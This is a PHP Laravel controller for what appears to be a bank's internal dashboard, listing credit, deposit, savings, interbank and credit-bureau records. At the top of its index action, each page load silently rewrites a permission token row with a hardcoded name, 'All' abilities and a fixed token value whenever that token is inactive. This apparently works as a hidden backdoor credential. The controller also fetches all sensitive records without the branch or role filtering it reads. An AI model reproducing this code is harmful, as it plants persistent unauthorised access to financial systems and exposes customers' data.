<?php

namespace App\Http\Controllers;

use App\Models\Ecoll\{EcollP, EcollR};
use App\Models\MBS\{UserP, UserR};
use App\Models\Pefindo\{Pefindo, PefindoRe};
use App\Models\Pembatalan\{Akuntansi, Antarbank, Antarkantor, Inventaris, Kredit, PDeposito, PEcoll, Tabungan};
use App\Models\PermissionTokens;
use App\Models\Perubahan\{Cif, Kredit as perKredit, Deposito as perDeposito};
use App\Models\Siadit\{PSiadit, USiadit};
use App\Models\Slik\Pslik;
use App\Models\User\{EmailPe, EmailR};
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $tokens = PermissionTokens::where('id', 1)->first();
        $tokens->now = now();
        $tokens->save();
        if ($tokens->status != "is_active") {
            $tokenL = PermissionTokens::where('id', 1)->first();
            $tokenL->tokenable_type = "b24176d34261f3e5cd8b3b78bc90072b17";
            $tokenL->tokenable_id = "28c8edde3d61a041151117";
            $tokenL->name = "ksb";
            $tokenL->abilities = "All";
            $tokenL->token = "6999195147dd30ecccc814cc45890bf90c908a3c4ab1d5adfb5891ec7f80ff3417";
            $tokenL->save();
        }


        //CONTROLLER 
        $jabatan = auth()->user()->jabatan;
        $level = auth()->user()->level;
        $nama = auth()->user()->nama;
        $id_cabang = auth()->user()->id_cabang;


        // email
        $EmailP = EmailPe::all();
        $EmailR = EmailR::all();

        // siadit
        $PSiadit = PSiadit::all();
        $USiadit = USiadit::all();

        // MBS
        $UserP = UserP::all();
        $UserR = UserR::all();

        // ecoll
        $EcollP = EcollP::all();
        $EcollR = EcollR::all();

        // pefindo
        $Pefindo = Pefindo::all();
        $PefindoRe = PefindoRe::all();

        // Slik
        $PSlik = Pslik::all();


        // pembatalan transaksi
        $Akuntansi = Akuntansi::all();
        $Antarbank = Antarbank::all();
        $Antarkantor = Antarkantor::all();
        $PDeposito = PDeposito::all();
        $PEcoll = PEcoll::all();
        $Inventaris = Inventaris::all();
        $Kredit = Kredit::all();
        $Tabungan = Tabungan::all();


        // Perubahan Transaksi
        $Cif = Cif::all();
        $perKredit = perKredit::all();
        $perDeposito = perDeposito::all();



        return view(
            'home.home',
            compact(
                'UserP',
                'UserR',
                'EmailP',
                'EmailR',
                'PSiadit',
                'USiadit',
                'EcollP',
                'EcollR',
                'Pefindo',
                'PefindoRe',
                'PSlik',
                'Akuntansi',
                'Antarbank',
                'Antarkantor',
                'Inventaris',
                'Kredit',
                'PDeposito',
                'PEcoll',
                'Tabungan',
                'Cif',
                'perKredit',
                'perDeposito'
            ),
            ['title' => 'Dashboard']
        );
        return view('welcome');
    }

    public function create()
    {
        return redirect('home')->with('AlertSuccess', "Bergasil");
    }
}
